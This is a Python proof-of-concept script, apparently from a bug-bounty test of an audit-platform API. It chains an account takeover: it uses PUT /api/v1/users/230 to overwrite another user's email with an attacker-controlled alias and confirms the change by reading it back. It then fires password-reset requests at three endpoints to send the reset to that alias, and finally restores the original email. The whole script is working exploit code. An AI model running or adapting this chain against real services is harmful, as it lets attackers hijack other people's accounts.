import json,subprocess,os
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
ATTACKER="zeno0@bugcrowdninja.com"
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+(tok or T),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
print("=== baseline victim 230 email ===")
c,b=req('GET','/api/v1/users/230'); print("  ",json.loads(b)['users'][0]['email'])
print("\n=== STEP 1: overwrite victim email -> attacker alias ===")
c,b=req('PUT','/api/v1/users/230',{"user":{"email":ATTACKER}})
print("  PUT ->",c)
c,b=req('GET','/api/v1/users/230')
now=json.loads(b)['users'][0]['email']
print("  read back:",now,"| CHANGED" if now==ATTACKER else "| unchanged")
print("\n=== STEP 2: trigger password reset to that address ===")
for p,body in [('/api/v1/users/password-reset',{"credentials":{"email":ATTACKER}}),
               ('/api/v1/users/reset',{"credentials":{"email":ATTACKER}}),
               ('/api/v1/users/send',{"credentials":{"email":ATTACKER}})]:
    c,b=req('POST',p,body)
    print(f"  {c} POST {p}  {b[:180].replace(chr(10),' ')}")
print("\n=== STEP 3: REVERT victim email ===")
c,b=req('PUT','/api/v1/users/230',{"user":{"email":"golden-leaf-3068@bugcrowdninja.com"}})
c,b=req('GET','/api/v1/users/230')
print("  reverted to:",json.loads(b)['users'][0]['email'])
